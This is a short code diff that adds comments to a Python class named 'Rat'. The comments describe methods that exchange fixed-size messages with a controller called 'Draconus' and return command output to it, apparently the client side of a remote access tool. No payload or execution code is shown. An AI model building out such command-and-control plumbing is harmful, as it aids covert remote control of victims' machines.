@@ -67,7 +67,8 @@ class Rat:
                 self.is_connected = True
             except:
                 continue
-
+    # send default pocket (message) to Draconus and recive response (1 bytes)
+    # default length is 256 bytes
     def send_pocket(self, msg):
         send = Msg(msg)
         try:
@@ -79,6 +80,9 @@ class Rat:
         except:
             return 0
 
+
+    # recive standard pocket (message) and send response (1 bytes)
+    # default length is 256 bytes
     def recive_pocket(self):
         output = None
         try:
@@ -94,6 +98,8 @@ class Rat:
             pass
         return output
 
+    # send output message to Draconus. Result of command
+    # default length 4kb
     def send_output(self, msg):
         output = Msg(msg, raw_len=OUT_LEN)
         try:
